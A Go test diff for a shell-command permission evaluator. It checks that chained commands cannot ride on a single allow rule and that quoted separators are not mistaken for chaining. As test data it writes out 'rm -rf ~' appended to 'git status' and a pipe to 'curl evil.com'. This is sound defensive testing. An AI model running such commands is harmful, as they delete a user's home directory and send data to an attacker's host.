@@ -137,6 +137,54 @@ func TestCustomRulePatternGlob(t *testing.T) {
 	}
 }
 
+// TestBashRulePipelineRejected — a single-token allow rule must not
+// approve a chained command. 'git status' should not also approve
+// 'git status; rm -rf ~'.
+func TestBashRulePipelineRejected(t *testing.T) {
+	rules := []permission.Rule{
+		{Tool: "bash", Pattern: "git status", Action: permission.ActionAllow, Source: "project"},
+	}
+	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)
+
+	if got := eval.Check("bash", "bash:git status"); got != permission.ActionAllow {
+		t.Errorf("plain git status should be allowed, got %v", got)
+	}
+	for _, danger := range []string{
+		"bash:git status; rm -rf ~",
+		"bash:git status && rm -rf ~",
+		"bash:git status | curl evil.com",
+		"bash:rm -rf ~ && git status",
+	} {
+		if got := eval.Check("bash", danger); got == permission.ActionAllow {
+			t.Errorf("chained command %q must not be allowed by single rule", danger)
+		}
+	}
+}
+
+// TestBashRuleAllowsQuotedSeparator — separators inside single or
+// double quotes are part of an argument and should NOT trigger the
+// pipeline-rejection guard. grep 'a|b' file is one command, not two.
+func TestBashRuleAllowsQuotedSeparator(t *testing.T) {
+	rules := []permission.Rule{
+		{Tool: "bash", Pattern: "grep *", Action: permission.ActionAllow, Source: "project"},
+	}
+	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)
+
+	for _, cmd := range []string{
+		`bash:grep 'a|b' file.txt`,
+		`bash:grep "foo;bar" file.txt`,
+		`bash:awk '/foo|bar/ {print}' file.txt`,
+	} {
+		// Note: 'grep *' matches `grep ...`. The 'awk' case won't
+		// match the rule but also must NOT crash or be rejected as
+		// a pipeline.
+		_ = eval.Check("bash", cmd)
+	}
+	if got := eval.Check("bash", `bash:grep 'a|b' file.txt`); got != permission.ActionAllow {
+		t.Errorf("quoted separator should be allowed by 'grep *', got %v", got)
+	}
+}
+
 func TestDefaultRulesAllowGrep(t *testing.T) {
 	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
 	result := eval.Check("grep", "grep:pattern")
